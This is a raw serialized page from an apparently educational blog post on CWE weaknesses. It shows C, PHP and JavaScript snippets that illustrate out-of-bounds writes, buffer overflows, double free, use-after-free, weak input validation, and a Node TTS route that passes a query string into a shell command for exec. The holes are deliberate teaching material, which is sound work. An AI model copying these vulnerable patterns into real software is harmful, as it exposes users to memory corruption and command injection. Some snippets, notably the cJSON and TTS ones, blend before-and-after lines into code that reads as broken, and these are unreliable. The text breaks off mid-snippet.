2:I[55329,["481","static/chunks/457b8330-69f8bab043e7caf2.js","954","static/chunks/d3ac728e-0c798b3b8aa3bf53.js","250","static/chunks/250-0ef8476c0fa8ee24.js","612","static/chunks/612-c60a65f28e774a61.js","548","static/chunks/548-617600d488b129da.js","877","static/chunks/app/%5B...slug%5D/page-bbc33dbeb20f4aed.js"],""]
3:I[93334,["481","static/chunks/457b8330-69f8bab043e7caf2.js","250","static/chunks/250-0ef8476c0fa8ee24.js","612","static/chunks/612-c60a65f28e774a61.js","931","static/chunks/app/page-fdd4c3156cea1bb0.js"],""]
4:"$Sreact.suspense"
6:I[30389,["481","static/chunks/457b8330-69f8bab043e7caf2.js","954","static/chunks/d3ac728e-0c798b3b8aa3bf53.js","250","static/chunks/250-0ef8476c0fa8ee24.js","612","static/chunks/612-c60a65f28e774a61.js","548","static/chunks/548-617600d488b129da.js","877","static/chunks/app/%5B...slug%5D/page-bbc33dbeb20f4aed.js"],""]
7:I[5613,[],""]
9:I[31778,[],""]
a:I[25694,["250","static/chunks/250-0ef8476c0fa8ee24.js","185","static/chunks/app/layout-884d0394d353bd4f.js"],"GlobalProvider"]
b:I[30397,["250","static/chunks/250-0ef8476c0fa8ee24.js","185","static/chunks/app/layout-884d0394d353bd4f.js"],""]
8:["slug","24b/learn-cwes","c"]
0:["7LjKDOS3m49yoEyK4Hs34",[[["",{"children":[["slug","24b/learn-cwes","c"],{"children":["__PAGE__?{\"slug\":[\"24b\",\"learn-cwes\"]}",{}]}]},"$undefined","$undefined",true],["",{"children":[["slug","24b/learn-cwes","c"],{"children":["__PAGE__",{},["$L1",[["$","$L2",null,{}],["$","div",null,{"id":"post-layout","children":[false,["$","div",null,{"id":"main","className":"center-wrapper","children":[["$","h1",null,{"className":"x-title","children":"Learn CWEs & Real-word Examples"}],["$","$L3",null,{"path":"/24b/learn-cwes/"}],["$","$4",null,{"fallback":["$","p",null,{"children":"Loading..."}],"children":["$","$4",null,{"fallback":["$","p",null,{"children":"Loading component..."}],"children":"$L5"}]}]]}],["$","$L6",null,{}]]}]],null]]},["$","$L7",null,{"parallelRouterKey":"children","segmentPath":["children","$8","children"],"loading":"$undefined","loadingStyles":"$undefined","loadingScripts":"$undefined","hasLoading":false,"error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L9",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","notFoundStyles":"$undefined","styles":[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/606e38edca29c81f.css","precedence":"next","crossOrigin":""}]]}]]},[null,["$","html",null,{"lang":"zh-CN","suppressHydrationWarning":true,"children":[["$","head",null,{"children":[["$","link",null,{"rel":"icon","href":"/favicon.ico","type":"image/x-icon"}],["$","script",null,{"async":true,"src":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"}],["$","script",null,{"async":true,"src":"https://www.googletagmanager.com/gtag/js?id=G-45BYSZ6WPY"}],["$","script",null,{"dangerouslySetInnerHTML":{"__html":"\nwindow.dataLayer = window.dataLayer || [];\nfunction gtag() {\n    dataLayer.push(arguments);\n}\ngtag('js', new Date());\ngtag('config', 'G-45BYSZ6WPY');\n"}}],["$","script",null,{"dangerouslySetInnerHTML":{"__html":"const a=z=>h.getItem(z),b=(y,z)=>h.setItem(y,z),c=(y,z)=>document.documentElement.setAttribute(y,z),d='theme',e='dark',f='light',g='class',h=localStorage;a(d)!==e&&a(d)!==f&&b(d,f);a(d)===e?c(g,e):c(g,f);"}}],["$","script",null,{"dangerouslySetInnerHTML":{"__html":"\nif (!Array.prototype.findLast) {\n    Array.prototype.findLast = function (callback) {\n        for (let i = this.length - 1; i >= 0; i--) {\n            if (callback(this[i])) return this[i];\n        }\n        return undefined;\n    };\n}\nif (!Array.prototype.findLastIndex) {\n    Array.prototype.findLastIndex = function (callback) {\n        for (let i = this.length - 1; i >= 0; i--) {\n            if (callback(this[i])) return i;\n        }\n        return -1;\n    };\n}\n"}}]]}],["$","body",null,{"children":["$","$La",null,{"children":[["$","$Lb",null,{}],["$","$L7",null,{"parallelRouterKey":"children","segmentPath":["children"],"loading":"$undefined","loadingStyles":"$undefined","loadingScripts":"$undefined","hasLoading":false,"error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L9",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":["$","div",null,{"id":"notfound","children":[["$","img",null,{"alt":"img","src":"/images/cry.gif"}],["$","code",null,{"id":"notfound-404","children":"404"}],["$","code",null,{"id":"notfound-text","children":"Page Not Found"}]]}],"notFoundStyles":[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/98e601cf5ba3633d.css","precedence":"next","crossOrigin":""}]],"styles":null}]]}]}]]}],null]],[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/6151b9c70d53df83.css","precedence":"next","crossOrigin":""}]],"$Lc"]]]]
d:I[74365,["481","static/chunks/457b8330-69f8bab043e7caf2.js","954","static/chunks/d3ac728e-0c798b3b8aa3bf53.js","250","static/chunks/250-0ef8476c0fa8ee24.js","612","static/chunks/612-c60a65f28e774a61.js","548","static/chunks/548-617600d488b129da.js","877","static/chunks/app/%5B...slug%5D/page-bbc33dbeb20f4aed.js"],""]
e:I[62029,["481","static/chunks/457b8330-69f8bab043e7caf2.js","954","static/chunks/d3ac728e-0c798b3b8aa3bf53.js","250","static/chunks/250-0ef8476c0fa8ee24.js","612","static/chunks/612-c60a65f28e774a61.js","548","static/chunks/548-617600d488b129da.js","877","static/chunks/app/%5B...slug%5D/page-bbc33dbeb20f4aed.js"],""]
f:T4dc,<span class="token keyword">int</span> id_sequence<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token comment">/* Populate the id array. */</span>

id_sequence<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span>
id_sequence<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">234</span><span class="token punctuation">;</span>
id_sequence<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">345</span><span class="token punctuation">;</span>
id_sequence<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">456</span><span class="token punctuation">;</span>
10:T674,<span class="token keyword">int</span> <span class="token function">returnChunkSize</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment">/* if chunk info is valid, return the size of usable memory,
    * else, return -1 to indicate an error.
    */</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">}</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>destBuf<span class="token punctuation">,</span> srcBuf<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token function">returnChunkSize</span><span class="token punctuation">(</span>destBuf<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">}</span>
11:T14c4,<span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">copy_input</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>user_supplied_string<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">int</span> i<span class="token punctuation">,</span> dst_index<span class="token punctuation">;</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>dst_buf <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token operator">*</span> MAX_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>MAX_SIZE <span class="token operator">&lt;=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>user_supplied_string<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"user string too long, die evil hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    dst_index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span>user_supplied_string<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token char">'&amp;'</span> <span class="token operator">==</span> user_supplied_string<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            dst_buf<span class="token punctuation">[</span>dst_index<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'&amp;'</span><span class="token punctuation">;</span>
            dst_buf<span class="token punctuation">[</span>dst_index<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'a'</span><span class="token punctuation">;</span>
            dst_buf<span class="token punctuation">[</span>dst_index<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'m'</span><span class="token punctuation">;</span>
            dst_buf<span class="token punctuation">[</span>dst_index<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'p'</span><span class="token punctuation">;</span>
            dst_buf<span class="token punctuation">[</span>dst_index<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">';'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token char">'&lt;'</span> <span class="token operator">==</span> user_supplied_string<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token comment">/* encode to &amp;lt; */</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span>
            dst_buf<span class="token punctuation">[</span>dst_index<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> user_supplied_string<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> dst_buf<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
12:T12e7,<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ctx<span class="token operator">-></span>in_seek<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">></span> remain<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">GF_LOG</span><span class="token punctuation">(</span>GF_LOG_WARNING<span class="token punctuation">,</span> GF_LOG_MEDIA<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"[MP3Dmx] truncated frame of size %u (remains %u)\n"</span><span class="token punctuation">,</span> size<span class="token punctuation">,</span> remain<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>bytes_skipped <span class="token operator">+</span> size <span class="token operator">></span> remain<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">GF_LOG</span><span class="token punctuation">(</span>GF_LOG_WARNING<span class="token punctuation">,</span> GF_LOG_MEDIA<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"[MP3Dmx] truncated frame of size %u (remains %d)\n"</span><span class="token punctuation">,</span> size<span class="token punctuation">,</span> remain<span class="token operator">-</span>bytes_skipped<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    dst_pck <span class="token operator">=</span> <span class="token function">gf_filter_pck_new_alloc</span><span class="token punctuation">(</span>ctx<span class="token operator">-></span>opid<span class="token punctuation">,</span> size<span class="token punctuation">,</span> <span class="token operator">&amp;</span>output<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>dst_pck<span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>output<span class="token punctuation">,</span> sync<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">gf_filter_pck_set_cts</span><span class="token punctuation">(</span>dst_pck<span class="token punctuation">,</span> ctx<span class="token operator">-></span>cts<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">gf_filter_pck_set_duration</span><span class="token punctuation">(</span>dst_pck<span class="token punctuation">,</span> nb_samp<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">gf_filter_pck_set_sap</span><span class="token punctuation">(</span>dst_pck<span class="token punctuation">,</span> GF_FILTER_SAP_1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">gf_filter_pck_set_framing</span><span class="token punctuation">(</span>dst_pck<span class="token punctuation">,</span> GF_TRUE<span class="token punctuation">,</span> GF_TRUE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>ctx<span class="token operator">-></span>byte_offset <span class="token operator">!=</span> GF_FILTER_NO_BO<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">gf_filter_pck_set_byte_offset</span><span class="token punctuation">(</span>dst_pck<span class="token punctuation">,</span> ctx<span class="token operator">-></span>byte_offset <span class="token operator">+</span> bytes_skipped<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">gf_filter_pck_send</span><span class="token punctuation">(</span>dst_pck<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
13:Tc8c,<span class="token variable">$nat_id</span>   <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>               <span class="token comment">// nat id</span>
<span class="token variable">$nat_type</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>             <span class="token comment">// src, dst</span>

<span class="token comment">// validate object type</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$obj_type</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'subnets'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ipaddresses'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token variable">$Result</span><span class="token operator">-></span><span class="token function">show</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"danger"</span><span class="token punctuation">,</span> <span class="token function">_</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Invalid object type"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>

<span class="token comment">// validate object id</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$obj_id</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token variable">$Result</span><span class="token operator">-></span><span class="token function">show</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"danger"</span><span class="token punctuation">,</span> <span class="token function">_</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Invalid object id"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
14:T12af,<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">BUFSIZER1</span> <span class="token expression"><span class="token number">512</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">BUFSIZER2</span> <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span>BUFSIZER1 <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span></span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>buf1R1<span class="token punctuation">;</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>buf2R1<span class="token punctuation">;</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>buf2R2<span class="token punctuation">;</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>buf3R2<span class="token punctuation">;</span>
    buf1R1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>BUFSIZER1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    buf2R1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>BUFSIZER1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>buf2R1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    buf2R2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>BUFSIZER2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    buf3R2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>BUFSIZER2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">strncpy</span><span class="token punctuation">(</span>buf2R1<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> BUFSIZER1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>buf1R1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>buf2R2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>buf3R2<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
15:T608,<span class="token keyword">char</span> <span class="token operator">*</span>ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    abrt <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>abrt<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">logError</span><span class="token punctuation">(</span><span class="token string">"operation aborted before commit"</span><span class="token punctuation">,</span> ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
16:T52d,static cJSON_bool add_item_to_object(cJSON * const object, const char * const string, cJSON * const item, const internal_hooks * const hooks, const cJSON_bool constant_key)
{
    char *new_key = NULL;
    int new_type = cJSON_Invalid;

    if ((object == NULL) || (string == NULL) || (item == NULL))
    {
        return false;
    }

    if (!(item->type & cJSON_StringIsConst) && (item->string != NULL))
    {
        hooks->deallocate(item->string);
    }

    if (constant_key)
    {
        item->string = (char*)cast_away_const(string);
        item->type |= cJSON_StringIsConst;
        new_key = (char*)cast_away_const(string);
        new_type = item->type | cJSON_StringIsConst;
    }
    else
    {
        char *key = (char*)cJSON_strdup((const unsigned char*)string, hooks);
        if (key == NULL)
        new_key = (char*)cJSON_strdup((const unsigned char*)string, hooks);
        if (new_key == NULL)
        {
            return false;
        }

        item->string = key;
        item->type &= ~cJSON_StringIsConst;
        new_type = item->type & ~cJSON_StringIsConst;
    }

    if (!(item->type & cJSON_StringIsConst) && (item->string != NULL))
    {
        hooks->deallocate(item->string);
    }

    item->string = new_key;
    item->type = new_type;

    return add_item_to_array(object, item);
}
17:T2288,<span class="token keyword">static</span> cJSON_bool <span class="token function">add_item_to_object</span><span class="token punctuation">(</span>cJSON <span class="token operator">*</span> <span class="token keyword">const</span> object<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span> <span class="token keyword">const</span> string<span class="token punctuation">,</span> cJSON <span class="token operator">*</span> <span class="token keyword">const</span> item<span class="token punctuation">,</span> <span class="token keyword">const</span> internal_hooks <span class="token operator">*</span> <span class="token keyword">const</span> hooks<span class="token punctuation">,</span> <span class="token keyword">const</span> cJSON_bool constant_key<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>new_key <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> new_type <span class="token operator">=</span> cJSON_Invalid<span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>object <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>string <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>item <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">return</span> false<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>item<span class="token operator">-></span>type <span class="token operator">&amp;</span> cJSON_StringIsConst<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>item<span class="token operator">-></span>string <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        hooks<span class="token operator">-></span><span class="token function">deallocate</span><span class="token punctuation">(</span>item<span class="token operator">-></span>string<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>constant_key<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        item<span class="token operator">-></span>string <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">cast_away_const</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">;</span>
        item<span class="token operator">-></span>type <span class="token operator">|=</span> cJSON_StringIsConst<span class="token punctuation">;</span>
        new_key <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">cast_away_const</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">;</span>
        new_type <span class="token operator">=</span> item<span class="token operator">-></span>type <span class="token operator">|</span> cJSON_StringIsConst<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">char</span> <span class="token operator">*</span>key <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">cJSON_strdup</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>string<span class="token punctuation">,</span> hooks<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
        new_key <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">cJSON_strdup</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>string<span class="token punctuation">,</span> hooks<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>new_key <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">return</span> false<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        item<span class="token operator">-></span>string <span class="token operator">=</span> key<span class="token punctuation">;</span>
        item<span class="token operator">-></span>type <span class="token operator">&amp;=</span> <span class="token operator">~</span>cJSON_StringIsConst<span class="token punctuation">;</span>
        new_type <span class="token operator">=</span> item<span class="token operator">-></span>type <span class="token operator">&amp;</span> <span class="token operator">~</span>cJSON_StringIsConst<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>item<span class="token operator">-></span>type <span class="token operator">&amp;</span> cJSON_StringIsConst<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>item<span class="token operator">-></span>string <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        hooks<span class="token operator">-></span><span class="token function">deallocate</span><span class="token punctuation">(</span>item<span class="token operator">-></span>string<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    item<span class="token operator">-></span>string <span class="token operator">=</span> new_key<span class="token punctuation">;</span>
    item<span class="token operator">-></span>type <span class="token operator">=</span> new_type<span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token function">add_item_to_array</span><span class="token punctuation">(</span>object<span class="token punctuation">,</span> item<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
18:T481,/** GET synthesize voice based on a voice model */
router.get('/tts', (req, res) => {
  const { text, type } = req.query;
  // TODO(twattanavekin): Test Unicode text.
  const escapedText = JSON.stringify(text).slice(1, -1);
  const sanitizedText = utils.replaceCharactersWithSpaces(text);

  // Example command:
  //  echo "hello" | ${SYNTH_SCRIPT}

  const cmd = `echo "${escapedText}" | ${SYNTH_SCRIPT}`;
  console.log(`Running command - \n${cmd}`);
  console.log(`Synthesizing ${sanitizedText}`);

  const options = {
    maxBuffer: 1024 * 1000, // 1 mb buffer
    cwd: '/tmp/',
    timeout: 60000, // 1 minute timeout
    encoding: 'buffer',
  };

  exec(cmd, options, (err, stdout, stderr) => {
  const child = exec(SYNTH_SCRIPT, options, (err, stdout, stderr) => {
    const errMsg = utils.getExecErrorMessage(err, stderr);
    if (errMsg) {
      return res.status(500).send(errMsg);
    }
    res.status(200);
    res.set('Content-Type', 'audio/wav');
    const data = type === 'base64' ? stdout.toString('base64') : stdout;
    return res.send(data);
  });
  child.stdin.write(sanitizedText);
  child.stdin.end();
});

module.exports = router;
19:T2503,<span class="token comment">/** GET synthesize voice based on a voice model */</span>
router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/tts'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token punctuation">{</span> text<span class="token punctuation">,</span> type <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">;</span>
  <span class="token comment">// TODO(twattanavekin): Test Unicode text.</span>
